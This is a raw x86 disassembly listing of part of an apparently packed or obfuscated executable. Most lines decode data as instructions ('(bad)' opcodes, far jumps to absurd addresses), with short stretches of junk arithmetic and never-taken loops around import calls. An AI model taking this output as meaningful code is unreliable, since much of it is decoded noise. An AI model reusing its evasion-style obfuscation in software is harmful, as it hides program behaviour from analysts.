  407412:	repnz fldenv es:[esi]
  407416:	sub    ebp,DWORD PTR [ebx]
  407418:	add    ch,BYTE PTR [eax+edx*2]
  40741b:	and    eax,0xb3dc9a29
  407420:	dec    ecx
  407421:	jp     0x4073df
  407423:	xor    ecx,edx
  407425:	adc    DWORD PTR [edi+edx*4],edx
  407428:	test   al,0x49
  40742a:	fisub  WORD PTR ds:0x4ce03ff6
  407430:	and    BYTE PTR [edx],dh
  407432:	out    dx,al
  407433:	push   eax
  407434:	shr    BYTE PTR [esi+edx*8],1
  407437:	js     0x4074a4
  407439:	jb     0x4073c5
  40743b:	stos   DWORD PTR es:[edi],eax
  40743c:	aaa    
  40743d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743e:	mov    ecx,0xc4aadf81
  407443:	mov    ch,0x55
  407445:	pop    edi
  407446:	push   0xffffffa2
  407448:	xor    BYTE PTR [esi+0x2f],ah
  40744b:	fdivr  st(5),st
  40744d:	cdq    
  40744e:	scas   al,BYTE PTR es:[edi]
  40744f:	sub    bl,0xdc
  407452:	sbb    DWORD PTR [ebx],edx
  407454:	cmp    DWORD PTR [esi+0x7c3a2f00],ebp
  40745a:	sti    
  40745b:	adc    BYTE PTR [ecx-0x11],ah
  40745e:	push   edi
  40745f:	in     eax,dx
  407460:	dec    eax
  407461:	sub    DWORD PTR [ebx-0xb],0xc3fad01d
  407468:	jae    0x4074c2
  40746a:	push   ss
  40746b:	fs pop eax
  40746d:	lods   eax,DWORD PTR ds:[esi]
  40746e:	push   DWORD PTR [edx+0x743ffcfc]
  407474:	or     al,0x35
  407476:	xchg   DWORD PTR [eax-0x15],ecx
  407479:	repnz cmc 
  40747b:	sub    eax,DWORD PTR [ecx]
  40747d:	cmp    BYTE PTR ds:0x49a2343e,bl
  407483:	pusha  
  407484:	cwde   
  407485:	lods   eax,DWORD PTR ds:[esi]
  407486:	int    0x57
  407488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407489:	imul   eax,ebx,0x1d
  40748c:	ds mov esp,0x825eaa60
  407492:	pop    esi
  407493:	dec    eax
  407494:	(bad)  
  407495:	or     esp,eax
  407497:	dec    ebx
  407498:	rcr    BYTE PTR [eax-0x43bec211],0x77
  40749f:	add    BYTE PTR [ecx],0xa5
  4074a2:	dec    ebx
  4074a3:	js     0x4074ff
  4074a5:	xchg   edx,eax
  4074a6:	cdq    
  4074a7:	pop    ss
  4074a8:	(bad)  
  4074a9:	(bad)  
  4074aa:	jmp    0x8c95d20f
  4074af:	int    0x62
  4074b1:	stos   DWORD PTR es:[edi],eax
  4074b2:	cmp    eax,0xb51b4c8
  4074b7:	push   esi
  4074b8:	aaa    
  4074b9:	or     DWORD PTR [ebx],edx
  4074bb:	mov    al,0xa1
  4074bd:	lds    esp,FWORD PTR cs:[eax+edi*4-0x79a8133f]
  4074c5:	push   es
  4074c6:	dec    ecx
  4074c7:	fst    DWORD PTR [ebx]
  4074c9:	scas   al,BYTE PTR es:[edi]
  4074ca:	pop    DWORD PTR [ecx]
  4074cc:	pop    ds
  4074cd:	push   0x2b0d3f93
  4074d2:	scas   al,BYTE PTR es:[edi]
  4074d3:	(bad)  
  4074d4:	out    dx,al
  4074d5:	(bad)  
  4074d6:	jge    0x40750e
  4074d8:	cmp    BYTE PTR [ebx+0x27],bh
  4074db:	stos   BYTE PTR es:[edi],al
  4074dc:	je     0x407543
  4074de:	mov    esi,0xbf55a36d
  4074e3:	into   
  4074e4:	cmp    esp,DWORD PTR [edx+0x573ed90c]
  4074ea:	mov    edi,DWORD PTR [esi]
  4074ec:	out    0xd,al
  4074ee:	jo     0x407520
  4074f0:	and    BYTE PTR [esi+0x2aab1a3d],bh
  4074f6:	push   eax
  4074f7:	mov    ah,0xae
  4074f9:	inc    esi
  4074fa:	bound  edi,QWORD PTR [ecx+0x10]
  4074fd:	out    0x13,al
  4074ff:	loopne 0x407556
  407501:	int    0x7f
  407503:	scas   al,BYTE PTR es:[edi]
  407504:	xor    ebp,ecx
  407506:	dec    eax
  407507:	dec    edx
  407508:	jae    0x407570
  40750a:	mov    ch,0x7d
  40750c:	adc    eax,0x9fe10761
  407511:	pop    es
  407512:	dec    esi
  407513:	xchg   ebp,eax
  407514:	xchg   edi,eax
  407515:	push   esp
  407516:	sahf   
  407517:	jmp    0x4074c5
  407519:	call   0x42979d58
  40751e:	dec    ecx
  40751f:	jge    0x40759b
  407521:	adc    bh,BYTE PTR [ecx-0x1f]
  407524:	aad    0xdc
  407526:	pop    ds
  407527:	inc    edi
  407528:	push   0x54
  40752a:	bound  eax,QWORD PTR [ebp+0x5c6eb9de]
  407530:	jge    0x407544
  407532:	push   ss
  407533:	pop    ecx
  407534:	xchg   esi,ebp
  407536:	loopne 0x4075b6
  407538:	push   eax
  407539:	cmc    
  40753a:	inc    edi
  40753b:	mov    ah,0x38
  40753d:	sbb    BYTE PTR [eax+0x68fdd843],dl
  407543:	gs clc 
  407545:	adc    ecx,DWORD PTR [eax-0x29642182]
  40754b:	adc    BYTE PTR [ebp+0x48e6e863],0xba
  407552:	test   eax,0x40d7e69e
  407557:	lock sbb eax,0x226b0727
  40755d:	dec    esi
  40755e:	sar    ah,1
  407560:	sub    ah,dl
  407562:	adc    ebp,esp
  407564:	and    DWORD PTR [eax-0x53],esp
  407567:	(bad)  
  407568:	pop    eax
  407569:	xchg   edi,eax
  40756a:	mov    ds:0xb8e9fe69,eax
  40756f:	jno    0x4075f0
  407571:	mov    DWORD PTR [ecx*1-0xc57d4ee],eax
  407578:	aas    
  407579:	mov    BYTE PTR ss:[eax-0x573759a1],ch
  407580:	jmp    0x1ae7:0xbfa81c11
  407587:	nop
  407588:	call   0x64dcfb18
  40758d:	neg    BYTE PTR [edx+ecx*2+0x3a]
  407591:	scas   eax,DWORD PTR es:[edi]
  407592:	dec    edx
  407593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407594:	cmp    al,0x1e
  407596:	icebp  
  407597:	push   ecx
  407598:	pop    edi
  407599:	cmp    al,bh
  40759b:	inc    ebx
  40759c:	push   edi
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x4336d3
  4075b4:	sub    DWORD PTR ds:0x43368f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43367f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4336eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43368f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43368f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43368f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43368f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43368f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	dec    ebp
  407656:	out    dx,al
  407657:	xor    eax,0x7ec01107
  40765c:	jle    0x407663
  40765e:	jl     0x4076de
  407660:	jle    0x407654
  407662:	fdiv   DWORD PTR ds:0xc28f1e02
  407668:	cmp    esp,DWORD PTR [eax-0x4d366e1]
  40766e:	and    eax,0x6d88ef42
  407673:	mov    edi,0xfbeb9a6c
  407678:	jbe    0x4076ed
  40767a:	ret    
  40767b:	dec    edx
  40767c:	test   al,0x96
  40767e:	ins    BYTE PTR es:[edi],dx
  40767f:	cmp    al,0xf4
  407681:	cmp    dl,BYTE PTR [ecx+0x7196821e]
  407687:	dec    ecx
  407688:	fstp   DWORD PTR gs:[esi+ecx*2]
  40768c:	stos   BYTE PTR es:[edi],al
  40768d:	les    edx,FWORD PTR [edx-0x642ec568]
  407693:	mov    WORD PTR [edi],ss
  407695:	lods   eax,DWORD PTR ds:[esi]
  407696:	and    edi,ebp
  407698:	shr    BYTE PTR [edx-0x1b89ebd1],1
  40769e:	inc    edi
  40769f:	jg     0x4076f9
  4076a1:	dec    ebp
  4076a2:	and    al,0x9f
  4076a4:	xor    eax,0x993e0176
  4076a9:	(bad)  
  4076ab:	(bad)  
  4076ac:	mov    ecx,0xf3021dfd
  4076b1:	sbb    edx,DWORD PTR [ebx]
  4076b3:	or     DWORD PTR [edx+0x1f],eax
  4076b6:	or     dl,BYTE PTR [edx+0x4f]
  4076b9:	inc    edi
  4076ba:	sbb    eax,0x688ff18e
  4076bf:	mov    edi,0xe8b56c0b
  4076c4:	pop    ds
  4076c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076c7:	pop    edx
  4076c8:	mov    edx,0x2250d79e
  4076cd:	test   eax,0x45dff198
  4076d2:	scas   eax,DWORD PTR es:[edi]
  4076d3:	test   BYTE PTR ds:0xfc0539c2,al
  4076d9:	push   ecx
  4076da:	fs xchg ebp,eax
  4076dc:	mov    bh,0xa0
  4076de:	mov    esp,gs
  4076e0:	xchg   ecx,eax
  4076e1:	xchg   edi,eax
  4076e2:	fimul  WORD PTR [edx+0x5f]
  4076e5:	mov    esi,0xa2bccc87
  4076ea:	mov    edi,ebx
  4076ec:	into   
  4076ed:	(bad)  
  4076ee:	test   eax,0x6c73418c
  4076f3:	pinsrw mm6,WORD PTR [ebp+0x42888bde],0xf9
  4076fb:	sub    eax,0x817d2c87
  407700:	fsubr  st(7),st
  407702:	cmp    DWORD PTR [esi],0xffffffd6
  407705:	test   DWORD PTR [edi-0x55],ecx
  407708:	and    eax,0x89912ae6
  40770d:	daa    
  40770e:	mov    dl,0xa9
  407710:	push   esp
  407711:	lds    ebp,FWORD PTR [eax+0x1f]
  407714:	test   DWORD PTR [edx],esp
  407716:	dec    ecx
  407717:	lahf   
  407718:	ss out 0x54,eax
  40771b:	and    BYTE PTR [edi-0x105f621],cl
  407721:	jl     0x407796
  407723:	pop    ds
  407724:	mov    bl,0xc3
  407726:	rol    BYTE PTR [ebx],cl
  407728:	pop    edx
  407729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40772a:	retf   
  40772b:	ins    DWORD PTR es:[edi],dx
  40772c:	xlat   BYTE PTR ds:[ebx]
  40772d:	out    0xa1,eax
  40772f:	mov    dl,0xae
  407731:	mov    BYTE PTR [ecx+eax*1+0x33fc5977],0x47
  407739:	das    
  40773a:	shl    cl,0x6f
  40773d:	into   
  40773e:	or     BYTE PTR [edx-0x13],0x78
  407742:	mov    eax,ds:0x28a16166
  407747:	push   ebp
  407748:	(bad)  
  407749:	push   0xd8b0bd38
  40774e:	ins    DWORD PTR es:[edi],dx
  40774f:	sub    ah,BYTE PTR [ecx-0x42]
  407752:	iret   
  407753:	xchg   edx,eax
  407754:	shl    DWORD PTR [esi-0x72d95f05],1
  40775a:	mov    al,ds:0x34128516
  40775f:	jge    0x40770a
  407761:	xchg   ecx,eax
  407762:	aaa    
  407763:	ss jns 0x4077d0
  407766:	pushf  
  407767:	test   eax,0x177f2835
  40776c:	pop    ds
  40776d:	or     cl,BYTE PTR [edx+0x129c071d]
  407773:	aaa    
  407774:	scas   eax,DWORD PTR es:[edi]
  407775:	or     ah,BYTE PTR [esi]
  407777:	mov    esi,0x8f3eb589
  40777c:	cmp    ecx,edx
  40777e:	out    0xe0,eax
  407780:	pop    eax
  407781:	bound  ebx,QWORD PTR [ebx-0x1919f254]
  407787:	push   cs
  407788:	pop    ebx
  407789:	call   0x9b0c:0xf5377551
  407790:	inc    esp
  407791:	pop    ecx
  407792:	icebp  
  407793:	imul   edi,DWORD PTR [esi-0x52bde48e],0x1348c3bc
  40779d:	pop    edx
  40779e:	adc    eax,DWORD PTR [ebp+ebp*1-0x71]
  4077a2:	mov    BYTE PTR [edx+0x12],ch
  4077a5:	jb     0x4077fb
  4077a7:	sbb    eax,0x6d80245a
  4077ac:	cmp    al,0xa8
  4077ae:	in     eax,0x2b
  4077b0:	jno    0x4077dc
  4077b2:	gs xchg ecx,eax
  4077b4:	jbe    0x407743
  4077b6:	fist   DWORD PTR [edi+esi*8+0x4757398f]
  4077bd:	pusha  
  4077be:	(bad)  
  4077bf:	sub    DWORD PTR [edx-0x39],0xffffffa3
  4077c3:	sub    eax,0x98c244ba
  4077c8:	inc    esp
  4077c9:	sar    BYTE PTR [ebx],cl
  4077cb:	call   0xa07e:0x19dc6bb3
  4077d2:	ficomp WORD PTR [ecx+ecx*4+0x5f]
  4077d6:	mov    cl,0x6d
  4077d8:	mov    ah,0xfe
  4077da:	fidivr DWORD PTR [edx-0x79]
  4077dd:	test   DWORD PTR [ecx],edx
  4077df:	mov    eax,0xe58d000a
  4077e4:	dec    ebx
  4077e5:	xchg   DWORD PTR [esi],edi
  4077e7:	mov    dl,0xac
  4077e9:	sbb    DWORD PTR [esi],0xf72b9d92
  4077ef:	cmp    BYTE PTR [edx],bl
  4077f1:	add    BYTE PTR ds:0x5b8031e2,al
  4077f7:	mov    al,0x14
  4077f9:	sub    eax,0xa37e25b
  4077fe:	jp     0x4077fd
  407800:	sti    
  407801:	push   ecx
  407802:	(bad)  
  407803:	outs   dx,DWORD PTR ds:[esi]
  407804:	fs push 0xf77fcaa6
  40780a:	out    dx,al
  40780b:	ficom  WORD PTR [eax+edi*4+0x7d82775e]
  407812:	fcomp  DWORD PTR [edx]
  407814:	pop    edx
  407815:	mov    eax,cs
  407817:	sub    eax,0xa8547b7e
  40781c:	out    0xf9,eax
  40781e:	rcl    esp,1
  407820:	fmul   DWORD PTR [ebx+esi*2]
  407823:	sub    al,BYTE PTR [esi-0x42]
  407826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407827:	xor    BYTE PTR [esi+esi*4],al
  40782a:	push   ss
  40782b:	jmp    0x3f55:0x4a8686d1
  407832:	fnstsw WORD PTR [ebx-0x47]
  407835:	sub    BYTE PTR [edx+0x69b10d46],bl
  40783b:	stos   BYTE PTR es:[edi],al
  40783c:	adc    cl,BYTE PTR [edx+0x47]
  40783f:	mov    ah,0xa9
  407841:	inc    eax
  407842:	lds    ecx,FWORD PTR [edx-0x1b]
  407845:	rcr    DWORD PTR [esi-0x46],0x5
  407849:	fidivr DWORD PTR [ebp-0x6d9cbf64]
  40784f:	push   ecx
  407850:	pop    es
  407851:	test   DWORD PTR [edi],ebx
  407853:	addr16 (bad) 
  407855:	rcr    DWORD PTR [edx],0xe6
  407858:	outs   dx,BYTE PTR ds:[esi]
  407859:	loop   0x4078c9
  40785b:	push   edx
  40785c:	xchg   ebp,eax
  40785d:	fbstp  TBYTE PTR [eax+edi*4-0xf73b09c]
  407864:	fstp   DWORD PTR [ebp-0x66]
  407867:	sar    DWORD PTR [edx+0x56f126f5],0x2b
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43367f,0x4336e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43379b,0x12
  40788b:	cmp    DWORD PTR ds:0x43379b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43379b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43379b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43379b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43371f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43371f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43371f,esi
  4078e0:	cmp    DWORD PTR ds:0x43371f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43371f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x13,eax
  407922:	jl     0x40790c
  407924:	push   ecx
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xe87e7e7c
  40792e:	push   edi
  40792f:	inc    ebx
  407930:	adc    eax,0x1186058b
  407935:	ret    0x783a
  407938:	push   0x4c
  40793a:	das    
  40793b:	lock adc DWORD PTR [esi+ebp*2],ecx
  40793f:	test   al,0x1b
  407941:	push   edx
  407942:	xor    dh,ah
  407944:	xor    ebp,esi
  407946:	sbb    eax,DWORD PTR [eax+0x770024d0]
  40794c:	cmp    eax,0xab760051
  407951:	mov    WORD PTR [ecx],fs
  407953:	mov    edx,DWORD PTR [esi+0xf2b274]
  407959:	xor    bl,BYTE PTR [ecx+0x24]
  40795c:	cmovb  eax,DWORD PTR ds:[ebx-0x21c7250a]
  407964:	frstor [ebx]
  407966:	push   ss
  407967:	fdiv   QWORD PTR [ebx-0x40f7baed]
  40796d:	std    
  40796e:	sbb    BYTE PTR ds:0x3d59928c,dl
  407974:	fdivr  QWORD PTR [ebx]
  407976:	mov    bl,0xe6
  407978:	push   ecx
  407979:	pop    es
  40797a:	pop    esp
  40797b:	xchg   ecx,eax
  40797c:	ins    DWORD PTR es:[edi],dx
  40797d:	push   edx
  40797e:	fist   DWORD PTR [esi]
  407980:	das    
  407981:	iret   
  407982:	retf   
  407983:	mov    gs,WORD PTR [ebx]
  407985:	ss push edx
  407987:	das    
  407988:	call   0xff60062d
  40798d:	xchg   ebp,eax
  40798e:	int    0xf
  407990:	jbe    0x407989
  407992:	aad    0x36
  407994:	sbb    BYTE PTR [ecx+ebp*2],dh
  407997:	scas   al,BYTE PTR es:[edi]
  407998:	je     0x407a01
  40799a:	neg    ebx
  40799c:	pop    ebx
  40799d:	fadd   DWORD PTR [esp+ecx*1-0x76]
  4079a1:	jmp    0x51a0:0xe504bdb8
  4079a8:	stos   BYTE PTR es:[edi],al
  4079a9:	repnz dec edi
  4079ab:	ja     0x407a20
  4079ad:	loop   0x40796f
  4079af:	lea    esi,[edx-0x1d]
  4079b2:	mov    eax,ds:0xa9de3f5f
  4079b7:	push   es
  4079b8:	add    DWORD PTR [ebp-0x3c],ebp
  4079bb:	pop    ecx
  4079bc:	jmp    0x407992
  4079be:	sub    DWORD PTR [eax+ebx*8+0x7cc658a7],ebx
  4079c5:	in     eax,dx
  4079c6:	or     al,0xfa
  4079c8:	out    dx,al
  4079c9:	mov    ?,WORD PTR [edx+0x7e7ac69c]
  4079cf:	jge    0x4079e6
  4079d1:	add    BYTE PTR [edx],al
  4079d3:	inc    ebp
  4079d4:	bound  ebp,QWORD PTR [edx+0x20]
  4079d7:	mov    esp,eax
  4079d9:	mov    BYTE PTR [eax],al
  4079db:	and    ebx,ebx
  4079dd:	enter  0x2594,0xe4
  4079e1:	aam    0x6b
  4079e3:	add    DWORD PTR [ebx-0x7585003b],esp
  4079e9:	push   ebp
  4079ea:	mov    eax,ds:0xa3c6f198
  4079ef:	xor    BYTE PTR [ecx+0x36709d7f],0x9b
  4079f6:	dec    ecx
  4079f7:	jbe    0x407a0e
  4079f9:	aam    0xd
  4079fb:	xor    esp,DWORD PTR [ecx-0x5e1e83d4]
  407a01:	inc    esp
  407a02:	rol    BYTE PTR [edx],1
  407a04:	mov    DWORD PTR [ebx],eax
  407a06:	mov    edi,0x416dd4c
  407a0b:	add    esp,DWORD PTR [ebp+0x5d]
  407a0e:	addr16 dec esp
  407a10:	mov    edi,0x88e0623f
  407a15:	push   edi
  407a16:	cmp    al,0x44
  407a18:	nop
  407a19:	test   bh,0x9f
  407a1c:	xor    eax,0x8e08c1fc
  407a21:	aaa    
  407a22:	rcl    BYTE PTR [ebx-0x12a315c9],cl
  407a28:	es test eax,0xbf419b47
  407a2e:	mov    ds:0x1c5ae945,eax
  407a33:	inc    ebp
  407a34:	mov    al,0x42
  407a36:	inc    esp
  407a37:	pop    ecx
  407a38:	in     eax,0xec
  407a3a:	sub    BYTE PTR ds:[edx+esi*8-0x7cb3b266],dl
  407a42:	inc    ecx
  407a43:	add    edx,0xffffffff
  407a46:	jp     0x4079cf
  407a48:	leave  
  407a49:	lock xchg DWORD PTR [ecx],ebp
  407a4c:	and    al,BYTE PTR [edx+0x11]
  407a4f:	mov    edi,0xe408c91c
  407a54:	add    BYTE PTR [eax+ecx*1-0x37],dl
  407a58:	and    al,0x99
  407a5a:	cmp    cl,BYTE PTR [esi+ebp*2]
  407a5d:	jge    0x407a56
  407a5f:	add    edi,DWORD PTR [ecx]
  407a61:	jne    0x4079f8
  407a63:	pop    esp
  407a64:	push   ecx
  407a65:	mov    bl,0xfb
  407a67:	std    
  407a68:	mov    DWORD PTR [eax+0x32d22ecc],esp
  407a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a6f:	shl    DWORD PTR [edi+0x2d9d9c],1
  407a75:	rcl    BYTE PTR [ecx+0x35],cl
  407a78:	call   0x58b2:0xfd0420d1
  407a7f:	out    dx,eax
  407a80:	push   esi
  407a81:	push   ebx
  407a82:	stc    
  407a83:	pop    ecx
  407a84:	imul   esi,DWORD PTR [eax-0x43],0x16
  407a88:	fwait
  407a89:	and    eax,0x4baa1c33
  407a8e:	xor    DWORD PTR [edi],edx
  407a90:	in     ax,0x41
  407a93:	mov    ch,0x43
  407a95:	xchg   DWORD PTR [edi-0x30],ebp
  407a98:	xor    DWORD PTR [edx-0x7d],edi
  407a9b:	pusha  
  407a9c:	aas    
  407a9d:	imul   esp,DWORD PTR [edx],0xffffffef
  407aa0:	popa   
  407aa1:	dec    ebp
  407aa2:	cld    
  407aa3:	mov    WORD PTR [eax],es
  407aa5:	push   edx
  407aa6:	es jns 0x407a84
  407aa9:	add    eax,0x9c8fc9de
  407aae:	std    
  407aaf:	shl    BYTE PTR [ecx],cl
  407ab1:	in     al,0x97
  407ab3:	lahf   
  407ab4:	dec    esp
  407ab5:	push   ebp
  407ab6:	or     al,0xb
  407ab8:	test   eax,0xf3514414
  407abd:	out    dx,al
  407abe:	cmp    esp,esi
  407ac0:	xchg   ebp,eax
  407ac1:	or     eax,0xe67e2065
  407ac6:	js     0x407b1c
  407ac8:	sub    edi,esp
  407aca:	daa    
  407acb:	jle    0x407b27
  407acd:	adc    BYTE PTR [ecx+0x3dfa6c32],al
  407ad3:	pop    esi
  407ad4:	inc    ebp
  407ad5:	(bad)
  407ad9:	cmp    BYTE PTR [ecx-0x32d4343d],dl
  407adf:	neg    BYTE PTR [esi-0x1b]
  407ae2:	sbb    al,dl
  407ae4:	xchg   esi,eax
  407ae5:	jmp    0xccd9:0x75f5db17
  407aec:	retf   0xcda4
  407aef:	dec    edi
  407af0:	int3   
  407af1:	out    dx,al
  407af2:	pop    ebp
  407af3:	add    cl,dh
  407af5:	in     eax,dx
  407af6:	add    edx,ebp
  407af8:	fwait
  407af9:	xchg   ebx,eax
  407afa:	lds    edx,FWORD PTR [ebp-0x13]
  407afd:	mov    esp,0x97025aff
  407b02:	aam    0x95
  407b04:	pop    ds
  407b05:	inc    esp
  407b06:	or     BYTE PTR [edx-0x4b],bh
  407b09:	or     BYTE PTR [edx],bl
  407b0b:	repz xor ebx,eax
  407b0e:	shr    DWORD PTR [ebp+0x6e0218ff],cl
  407b14:	cdq    
  407b15:	sub    BYTE PTR [esi+0x25],dl
  407b18:	and    ebp,DWORD PTR [ecx]
  407b1a:	clc    
  407b1b:	add    al,BYTE PTR [ecx+0x3b]
  407b1e:	aam    0x76
  407b20:	(bad)  
  407b21:	in     al,dx
  407b22:	lea    ebp,[ebx-0x23]
  407b25:	inc    ebp
  407b26:	and    bl,BYTE PTR [ebx-0x1b]
  407b29:	and    DWORD PTR [ebx-0x513cc3f7],esp
  407b2f:	loope  0x407b22
  407b31:	outs   dx,BYTE PTR ds:[esi]
  407b32:	loope  0x407ad3
  407b34:	test   eax,0x3358483a
  407b39:	rol    DWORD PTR [ecx+0x43372b15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x4336d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433687,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4337af,0x43368f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43371f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433683
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433727,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43369f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4336eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4336eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433757
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4336d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4336d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4336d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4336d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4336d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4336d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4336d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4336d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	hlt    
  407c4b:	loope  0x407c6a
  407c4d:	jecxz  0x407c7a
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x817e7e7c
  407c57:	pushf  
  407c58:	ja     0x407c7a
  407c5a:	leave  
  407c5b:	and    ebx,DWORD PTR [edx]
  407c5d:	cmp    BYTE PTR [ebp+0xf3efeb3],bl
  407c63:	push   cs
  407c64:	jbe    0x407cc5
  407c66:	(bad)  
  407c67:	xor    BYTE PTR [esi-0x4e405713],bh
  407c6d:	mov    dh,0xd
  407c6f:	jns    0x407cd6
  407c71:	test   DWORD PTR [esi-0x3d],edx
  407c74:	fist   DWORD PTR [esi-0xce5429b]
  407c7a:	sub    eax,0x8b8f6a9c
  407c7f:	mov    ebx,eax
  407c81:	sub    DWORD PTR [ecx+0x71],0x46
  407c85:	call   0xf1be62a3
  407c8a:	cld    
  407c8b:	cmp    ebx,esp
  407c8d:	rcl    BYTE PTR [edi],0x52
  407c90:	sub    DWORD PTR [esi-0x6b],edx
  407c93:	xchg   dh,dl
  407c95:	and    eax,0xf64b2ab6
  407c9a:	pop    ds
  407c9b:	mov    eax,ds:0x676fd61b
  407ca0:	shl    BYTE PTR [esi-0x374597de],0x62
  407ca7:	lock xor ch,BYTE PTR [eax+0x3d]
  407cab:	pop    edi
  407cac:	mov    ebx,0x1a642d64
  407cb1:	jno    0x407cd5
  407cb3:	or     bh,BYTE PTR [ebx-0x3649491d]
  407cb9:	mov    al,bl
  407cbb:	dec    ecx
  407cbc:	call   0x6194:0xe2fcd444
  407cc3:	push   eax
  407cc4:	adc    esi,DWORD PTR [ecx+edi*4]
  407cc7:	xchg   edx,eax
  407cc8:	dec    ebx
  407cc9:	inc    ebx
  407cca:	test   edi,esp
  407ccc:	or     eax,eax
  407cce:	out    0x6d,eax
  407cd0:	sub    al,0x75
  407cd2:	inc    edx
  407cd3:	mov    ds:0x4f23ea79,eax
  407cd8:	mov    ds:0x8dc55922,eax
